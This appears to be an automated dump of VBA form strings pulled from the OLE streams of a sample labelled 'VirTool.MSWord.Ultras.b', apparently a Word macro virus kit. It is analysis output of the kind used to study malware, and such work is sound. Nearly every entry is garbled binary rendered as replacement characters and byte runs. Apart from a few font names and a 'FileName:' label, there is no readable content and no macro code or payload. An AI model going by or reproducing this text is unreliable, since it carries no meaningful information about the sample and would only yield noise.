- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
``t������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������fffDDDQQR������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Small Fonts
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FileName:rB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������큃�CE�CD�CE�DF�rt쑒���������������������������������������������������������������������������������������������������������������������������������������������Ө�������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������𰱰��`aq@Ac@ArAA�QQ�����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������ک�����opqpqqqsrrts���������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aBD�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǐ�����������������������#$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#$ࠡ����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!"!%&%��������������������������󣤤VWYOPRRSUVWYYZ]]^_`acddhhhlkkpoos���������������������������������������������������������bd�ac�`b�_a�^_�]^�\^�[^�[\�Z]�Z\�Y\�Y\�Y[�Y[�Y[�Y[�������������[\�[]�\^�]_�^_�_a�`b�bc�������������������no�pq�rs�uu�ww�vv}ppviin������������������������������\\\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``�����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SSS������������������������������������������QRS:;;;<==>?>?@@ABABCBCEDEFEFGFGHuwv������������������������������PRPPRPQTQQTQQTPRUQRUQRUQRUR~�}���������SWPSXORXNRYMRZLRZKR\IR]GR^E���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
eAC�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������"#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�22�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#$"'('������������������������RSSIJLLLOPPSSSVWXZZZ]]^aaaeddhhhlkkpoosrrwvv{���������������������������������������������������cd�bc�ab�`a�_a�^`�^_�]_�\^�\]�[]�[]�[]�[\�[\�[\�[\�������������]^�]_�^`�_a�`b�ac�cd�de����������������wx�pq�rs�uu�ww�ww}qqwkkpddi�����������������������򁁁
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l��������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QQR������������������������������������YZ\56878:89;:;=<=?=>??@A@ABABDCDEDEFEFGFGIGHJ���������������������������OQPPRQPRQQSRQSRRTSRTSRTRRUS~�~���������SVRSWRSWQSXPSXPRYNRZMR\IR]F���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������qrq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
eAB�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʯ��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$%$'()���������������������DEGHIJKKMNNQQQTTTWXX[[[_^^caafeejhhmkkpoosrrxvv{xx������������������������������������������������de�cd�bc�ac�ab�`a�_a�_`�^_�^_�]_�]^�]^�]^�]^�]^�]^�������������_`�`a�`b�ac�bd�de�ef�fg����������������pq�ss�uu�ww�ww~rrwllqeej^^c���������������������KKL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PPP���������������������������������==?22444656877:9:<:;=<<?==@?@A@ABABDCDEDEFEFHFGIGHJjkm���������������������OPQOPQPQRPQRQRSQRSRSTRTSRTS}���������SUSSVSSWRTXRTXQSYPSZMS[LR\I���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������AAA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
gAA�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  "$$&()*������������������CCFFFIIIMLLPOOSRRWVVZYY]\\`__dbbgeejhhnllqootrrxuu{xx~xx����������������������������������������������ef�de�ce�cd�bc�ab�ab�`a�`a�_a�_`�_`�^`�^`�^`�^`�_`�������������ab�bc�cd�de�ef�fg�gh�hi����������������ss�uu�ww�ww~rrxllrffk``dYY]}}�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v��������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MMN������������������������������FFH..000222444655877:99<::=<<?==@??B@ABABDCDEDEFEFHFFJGGKvwx������������������NOQNOQOPRPQSPQSQRTQRSQRSRST}~���������STUSUTSUSSVSSWQSXPSYOSZMS[L���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0=!+6 '0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������!!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&aa{���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
gAA�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�11����������QQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�11����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!#%%')),���������������YY[DDGGGKKKNNNRQQUTTXWW[ZZ^]]a``ecchffkiinllqoourrxuu{xx~xx�ww�������������������������������������������fg�eg�ef�de�cd�cd�bc�bc�ab�ab�ab�`b�`b�`b�`b�`b�ab�������������cd�de�ef�fg�gh�hi�ij�kk����������������uu�ww�ww~ssxmmrgglaaeZZ_SSXyy|���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{��������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
LLL���������������������������yyz**,,,...000222444655877:99;::=<<?==@??B@@CAADBBFDDGEEHFFIGGJ������������������MMPNNPNNQOPROPRPQSPPSQRTQRS}}����������STUSTUSUTSUSSVRSWQSXORYNR[K���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0<!,6 '/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%@A`���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g@A�������@A�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`a�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@A����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
""$&&(++-���������������BBEEEIIILLLPOOSSSWUUZXX][[`^^caafddiggljjollroourrxuu{xx~xx�ww�������������������������������������������gh�gh�fg�ef�ef�de�ce�cd�cd�bd�bc�bc�bc�bc�bc�bc�cd�������������ef�fg�gh�hi�ij�jk�kl�mm�������������uu�ww�ww~ssxmmsggmaaf[[`UUYNNRuux���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JJJ���������������������������%%'((***,,,...000211433655877988;::=;;>==@>>A??CAADBBECCGDDHEEI]]a���������������LLOLLPMMPNNQNNQOOROORPPSPPS}}���������RSURSTRTSSUTSUSSVRSWPRXNRZL���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1="-7!(0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$  E���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g@@�������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ##%''),,.������������{{~CCFGGJJJNNNQQQUTTXWW[ZZ^]]a���������ggmjjommrppurrxuu{xx~xx�ww�����������������������������������������hi�hi�gh�fg�fg�ef�ef�ef�de�de�de�de�de�de�de�de�df�������������gh�hi�ij�jk�kl�lm�nn�op�������������wx�ww~ssxmmshhmbbg\\aVVZOOSIILqqt������������99:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������
-------------------------------------------------------------------------------
